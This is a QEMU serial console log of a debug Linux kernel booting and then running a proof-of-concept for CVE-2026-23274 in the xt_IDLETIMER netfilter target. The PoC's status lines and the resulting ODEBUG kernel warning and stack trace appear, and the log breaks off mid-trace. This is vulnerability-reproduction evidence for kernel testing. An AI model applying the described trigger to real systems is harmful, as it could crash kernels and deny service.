c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 7.0.0-rc2-00306-g6dcee8496d53-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 16:04:51 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff]  System RAM
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff]  device reserved
[    0.000000] BIOS-e820: [gap 0x00000000000a0000-0x00000000000effff]
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff]  device reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff]  System RAM
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff]  device reserved
[    0.000000] BIOS-e820: [gap 0x0000000080000000-0x00000000feffbfff]
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff]  device reserved
[    0.000000] BIOS-e820: [gap 0x00000000ff000000-0x00000000fffbffff]
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff]  device reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 223801923 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000314] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000333] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000335] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002278] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002285] Using GB pages for direct mapping
[    0.002373] RAMDISK: [mem 0x7fe92000-0x7ffdffff]
[    0.002377] ACPI: Early table checksum verification disabled
[    0.002379] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002382] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002387] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002391] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002394] ACPI: FACS 0x000000007FFE0000 000040
[    0.002396] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002398] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002399] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002401] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002402] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002403] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002404] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002405] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002405] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002587] No NUMA configuration found
[    0.002587] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002589] NODE_DATA(0) allocated [mem 0x7fe8e900-0x7fe91fff]
[    0.062355] KernelAddressSanitizer initialized (generic)
[    0.062550] ACPI: PM-Timer IO Port: 0x608
[    0.062562] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.062588] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.062590] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.062592] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.062593] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.062593] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.062594] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.062597] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.062597] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.062600] TSC deadline timer available
[    0.062602] CPU topo: Max. logical packages:   1
[    0.062603] CPU topo: Max. logical dies:       1
[    0.062603] CPU topo: Max. dies per package:   1
[    0.062605] CPU topo: Max. threads per core:   1
[    0.062606] CPU topo: Num. cores per package:     2
[    0.062606] CPU topo: Num. threads per package:   2
[    0.062606] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.062620] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.062632] kvm-guest: KVM setup pv remote TLB flush
[    0.062635] kvm-guest: setup PV sched yield
[    0.062639] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.062640] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.062642] [gap 0x80000000-0xfeffbfff] available for PCI devices
[    0.062643] Booting paravirtualized kernel on KVM
[    0.062644] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.070091] Zone ranges:
[    0.070092]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.070094]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.070095]   Normal   empty
[    0.070096] Movable zone start for each node
[    0.070096] Early memory node ranges
[    0.070096]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.070097]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.070098] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.071100] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.071129] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.096723] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.096733] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.096964] percpu: Embedded 64 pages/cpu s224344 r8192 d29608 u1048576
[    0.097001] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.097045] random: crng init done
[    0.097046] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.097249] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.097456] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.097506] Fallback order for Node 0: 0 
[    0.097508] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.097509] Policy zone: DMA32
[    0.097510] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.097511] stackdepot: allocating hash table via alloc_large_system_hash
[    0.097513] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.111924] stackdepot: allocating space for 8192 stack pools via memblock
[    0.132326] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.133621] Dynamic Preempt: lazy
[    0.136065] rcu: Preemptible hierarchical RCU implementation.
[    0.136067] rcu: 	RCU event tracing is enabled.
[    0.136067] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.136069] 	Trampoline variant of Tasks RCU enabled.
[    0.136070] 	Tracing variant of Tasks RCU enabled.
[    0.136070] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.136071] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.136095] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.144982] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.145222] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.147464] Console: colour VGA+ 80x25
[    0.147493] printk: legacy console [ttyS0] enabled
[    0.186797] ACPI: Core revision 20251212
[    0.192937] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.193525] APIC: Switch to symmetric I/O mode setup
[    0.193908] x2apic enabled
[    0.194216] APIC: Switched APIC routing to: physical x2apic
[    0.194562] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.194966] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.195471] kvm-guest: setup PV IPIs
[    0.196340] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.196702] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.197286] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.198365] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.198770] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.199282] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.199630] mitigations: Enabled attack vectors: user_kernel, user_user, SMT mitigations: auto
[    0.200109] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.200283] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.200607] ITS: Mitigation: Aligned branch/return thunks
[    0.201282] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.201744] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.202158] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.202283] active return thunk: its_return_thunk
[    0.202562] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.203282] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.203657] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.204028] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.204282] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.204641] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.205282] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.219954] Freeing SMP alternatives memory: 44K
[    0.220234] pid_max: default: 32768 minimum: 301
[    0.220383] SELinux:  Initializing.
[    0.220748] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.221284] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.221871] VFS: Finished mounting rootfs on nullfs
[    0.222605] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.223281] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.223305] signal: max sigframe size: 3632
[    0.223578] rcu: Hierarchical SRCU implementation.
[    0.223853] rcu: 	Max phase no-delay instances is 400.
[    0.224203] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.226308] smp: Bringing up secondary CPUs ...
[    0.227439] smpboot: x86: Booting SMP configuration:
[    0.227732] .... node  #0, CPUs:      #1
[    0.227816] smp: Brought up 1 node, 2 CPUs
[    0.228523] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.228982] Memory: 1682016K/2096632K available (45699K kernel code, 8308K rwdata, 10152K rodata, 5636K init, 1064K bss, 407156K reserved, 0K cma-reserved)
[    0.229437] devtmpfs: initialized
[    0.231421] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.231861] posixtimers hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.232286] futex hash table entries: 512 (32768 bytes on 1 NUMA nodes, total 32 KiB, linear).
[    0.232910] PM: RTC time: 16:08:28, date: 2026-05-05
[    0.233337] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.233890] audit: initializing netlink subsys (disabled)
[    0.234240] audit: type=2000 audit(1777997308.890:1): state=initialized audit_enabled=0 res=1
[    0.235300] thermal_sys: Registered thermal governor 'step_wise'
[    0.235323] cpuidle: using governor menu
[    0.236146] PCI: Using configuration type 1 for base access
[    0.236375] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.242304] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.242694] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.243570] ACPI: Added _OSI(Module Device)
[    0.243816] ACPI: Added _OSI(Processor Device)
[    0.244071] ACPI: Added _OSI(Processor Aggregator Device)
[    0.250605] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.251750] ACPI: \_SB_: platform _OSC: OS support mask [002a7eee]
[    0.252823] ACPI: Interpreter enabled
[    0.253064] ACPI: PM: (supports S0 S3 S4 S5)
[    0.253283] ACPI: Using IOAPIC for interrupt routing
[    0.253595] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.254112] PCI: Using E820 reservations for host bridge windows
[    0.254625] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.266975] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.267290] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.267735] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.268305] acpi PNP0A03:00: _OSC: platform retains control of PCIe features (AE_ERROR)
[    0.268794] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.269448] PCI host bridge to bus 0000:00
[    0.269707] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.270095] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.270284] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.270736] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.271174] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.271285] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.271647] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.276349] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.280962] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.281637] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.281976] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.282283] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.282638] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.283044] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.283448] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.284143] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.284287] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.284927] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.285945] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.286293] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.286666] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.287095] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.291411] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.292539] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.292882] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.293200] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.299649] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.300398] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.301119] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.301653] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.302145] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.303292] iommu: Default domain type: Translated
[    0.303569] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.304454] SCSI subsystem initialized
[    0.306402] ACPI: bus type USB registered
[    0.306684] usbcore: registered new interface driver usbfs
[    0.307016] usbcore: registered new interface driver hub
[    0.307295] usbcore: registered new device driver usb
[    0.307622] pps_core: LinuxPPS API ver. 1 registered
[    0.307904] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.308289] PTP clock support registered
[    0.311382] Advanced Linux Sound Architecture Driver Initialized.
[    0.312086] NetLabel: Initializing
[    0.312283] NetLabel:  domain hash size = 128
[    0.312546] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.312906] NetLabel:  unlabeled traffic allowed by default
[    0.313336] PCI: Using ACPI for IRQ routing
[    0.313629] e820: register RAM buffer resource [mem 0x0009fc00-0x0009ffff]
[    0.314032] e820: register RAM buffer resource [mem 0x7ffe0000-0x7fffffff]
[    0.314335] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.314676] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.315004] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.315283] vgaarb: loaded
[    0.315501] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.315783] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.318317] clocksource: Switched to clocksource kvm-clock
[    0.318885] VFS: Disk quotas dquot_6.6.0
[    0.319122] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.320392] pnp: PnP ACPI init
[    0.321669] pnp: PnP ACPI: found 6 devices
[    0.329937] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.330524] NET: Registered PF_INET protocol family
[    0.330839] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.331684] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.332174] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.340362] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.340857] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.341306] TCP: Hash tables configured (established 16384 bind 16384)
[    0.341719] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.342112] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.342597] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.343157] RPC: Registered named UNIX socket transport module.
[    0.343498] RPC: Registered udp transport module.
[    0.343766] RPC: Registered tcp transport module.
[    0.344036] RPC: Registered tcp-with-tls transport module.
[    0.344359] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.345058] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.345417] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.345806] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.346334] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.346864] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.348185] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.349205] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.350322] PCI: CLS 0 bytes, default 64
[    0.351158] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.351211] Unpacking initramfs...
[    0.352588] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.358870] Initialise system trusted keyrings
[    0.361135] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.363083] NFS: Registering the id_resolver key type
[    0.363964] Key type id_resolver registered
[    0.364710] Key type id_legacy registered
[    0.365414] nfs4filelayout_init: NFSv4 File Layout Driver Registering...
[    0.366579] nfs4flexfilelayout_init: NFSv4 Flexfile Layout Driver Registering...
[    0.367428] 9p: Installing v9fs 9p2000 file system support
[    0.367937] Freeing initrd memory: 1336K
[    0.374773] Key type asymmetric registered
[    0.375077] Asymmetric key parser 'x509' registered
[    0.375461] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.376011] io scheduler mq-deadline registered
[    0.376347] io scheduler kyber registered
[    0.376809] input: Power Button as /devices/platform/LNXPWRBN:00/input/input0
[    0.377346] ACPI: button: Power Button [PWRF]
[    0.377963] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.378606] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.379920] Non-volatile memory driver v1.3
[    0.380205] Linux agpgart interface v0.103
[    0.386536] loop: module loaded
[    0.387875] scsi host0: ata_piix
[    0.388398] scsi host1: ata_piix
[    0.388727] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.389309] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.390335] e100: Intel(R) PRO/100 Network Driver
[    0.390611] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.390960] e1000: Intel(R) PRO/1000 Network Driver
[    0.391252] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.546279] ata2: found unknown device (class 0)
[    0.546987] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.547981] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.574362] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.574750] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.584263] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.744500] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.031745] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.032200] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.032635] e1000e: Intel(R) PRO/1000 Network Driver
[    1.032928] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.033317] sky2: driver version 1.30
[    1.033853] usbcore: registered new interface driver usblp
[    1.034201] usbcore: registered new interface driver usb-storage
[    1.034610] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.035534] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.035829] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.036359] rtc_cmos 00:05: RTC can wake from S4
[    1.037100] rtc_cmos 00:05: registered as rtc0
[    1.037420] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.038092] device-mapper: ioctl: 4.50.0-ioctl (2025-04-28) initialised: dm-devel@lists.linux.dev
[    1.038608] intel_pstate: CPU model not supported
[    1.038906] hid: raw HID events driver (C) Jiri Kosina
[    1.039274] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.039650] usbcore: registered new interface driver usbhid
[    1.040116] usbhid: USB HID core driver
[    1.042245] Initializing XFRM netlink socket
[    1.042556] NET: Registered PF_INET6 protocol family
[    1.043335] Segment Routing with IPv6
[    1.043574] In-situ OAM (IOAM) with IPv6
[    1.043846] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.044442] NET: Registered PF_PACKET protocol family
[    1.044777] 9pnet: Installing 9P2000 support
[    1.045065] Key type dns_resolver registered
[    1.045612] IPI shorthand broadcast: enabled
[    1.057408] sched_clock: Marking stable (1008000912, 49053481)->(1087424946, -30370553)
[    1.058118] registered taskstats version 1
[    1.058360] Loading compiled-in X.509 certificates
[    1.067810] Demotion targets for Node 0: null
[    1.068200] PM:   Magic number: 10:131:135
[    1.068490] netconsole: network logging started
[    1.068839] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.069420] kworker/u8:0 (56) used greatest stack depth: 29616 bytes left
[    1.072548] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.073018] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.073457] ALSA device list:
[    1.073634]   No soundcards found.
[    1.074673] Freeing unused kernel image (initmem) memory: 5636K
[    1.074924] Write protecting the kernel read-only data: 57344k
[    1.075477] Freeing unused kernel image (text/rodata gap) memory: 1404K
[    1.075759] Freeing unused kernel image (rodata/data gap) memory: 88K
[    1.076114] faux_driver regulatory: Direct firmware load for regulatory.db failed with error -2
[    1.076451] cfg80211: failed to load regulatory.db
[    1.086482] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.086772] Run /init as init process
[    1.087495] mkdir (60) used greatest stack depth: 28208 bytes left
[    1.089158] mount (64) used greatest stack depth: 27744 bytes left
[    1.091567] busybox (66) used greatest stack depth: 27160 bytes left

secb: rootfs ready
---- poc begin ----
poc: start: CVE-2026-23274 xt_IDLETIMER rev0 over rev1-ALARM panic
poc: install rev=1 std=152 idle=192 err=176 total=824 rc=0 errno=0
poc: rev1 ALARM install rc=0 ok
[    1.094525] ------------[ cut here ]------------
[    1.094709] ODEBUG: assert_init not available (active state 0) object: 000000002b9e06a3 object type: timer_list hint: 0x0
[    1.095133] WARNING: lib/debugobjects.c:629 at debug_print_object+0x189/0x2b0, CPU#1: poc/67
[    1.095465] Modules linked in:
[    1.095592] CPU: 1 UID: 0 PID: 67 Comm: poc Not tainted 7.0.0-rc2-00306-g6dcee8496d53-dirty #1 PREEMPT(lazy) 
[    1.095975] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.096347] RIP: 0010:debug_print_object+0x193/0x2b0
[    1.096544] Code: df 8b 5b 10 48 8d 3c dd e0 c9 fd 83 48 89 fa 48 c1 ea 03 80 3c 02 00 75 52 48 8d 3d 87 e7 ce 02 41 55 48 8b 14 dd e0 c9 fd 83 <67> 48 0f b9 3a 58 83 05 94 09 cd 02 01 48 83 c4 20 5b 5d 41 5c 41
[    1.097549] RSP: 0018:ffffc9000040f4c8 EFLAGS: 00010246
[    1.097756] RAX: dffffc0000000000 RBX: 0000000000000005 RCX: 0000000000000000
[    1.098032] RDX: ffffffff83fdc9a0 RSI: ffffffff83fdc620 RDI: ffffffff850329c0
[    1.098314] RBP: 0000000000000001 R08: ffff888006b2d488 R09: ffffffff83e92e80
[    1.098591] R10: 0000000000000246 R11: 0000000000000000 R12: ffffffff83e92ec0
[    1.098869] R13: 0000000000000000 R14: ffffc9000040f588 R15: 1ffff92000081ea8
[    1.099149] FS:  0000000030964380(0000) GS:ffff8880e762c000(0000) knlGS:0000000000000000
[    1.099462] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.099690] CR2: 00007ffef36bd5f0 CR3: 00000000092bc006 CR4: 0000000000770ef0
[    1.099969] PKRU: 55555554
[    1.100157] Call Trace:
[    1.100305]  <TASK>
[    1.100435]  debug_object_assert_init+0x1e8/0x2e0
[    1.100692]  ? __pfx_debug_object_assert_init+0x10/0x10
[    1.101069]  ? unwind_get_return_address+0x59/0xa0
[    1.101266]  ? unwind_next_frame+0x39d/0x2400
[    1.101440]  ? arch_stack_walk+0x73/0x100
[    1.101601]  __mod_timer+0x98/0x9f0
[    1.101745]  ? __kernel_text_address+0xd/0x40
[    1.101920]  ? unwind_get_return_address+0x59/0xa0
[    1.102116]  ? __pfx___mod_timer+0x10/0x10
[    1.102280]  ? mutex_lock+0x8b/0xe0
[    1.102422]  ? __pfx_mutex_lock+0x10/0x10
[    1.102582]  ? pcpu_block_update_hint_alloc+0x1fd/0xaf0
[    1.102788]  idletimer_tg_checkentry+0x1ee/0x840
[    1.102976]  xt_check_target+0x1f5/0x8e0
[    1.103139]  ? mutex_unlock+0x7d/0xd0
[    1.103288]  ? __pfx_xt_check_target+0x10/0x10
[    1.103466]  ? mutex_unlock+0x7d/0xd0
[    1.103615]  ? __pfx_mutex_unlock+0x10/0x10
[    1.103782]  ? xt_find_target.part.0+0x10f/0x1b0
[    1.103966]  find_check_entry.constprop.0+0x6e8/0x9b0
[    1.104172]  ? __pfx_find_check_entry.constprop.0+0x10/0x10
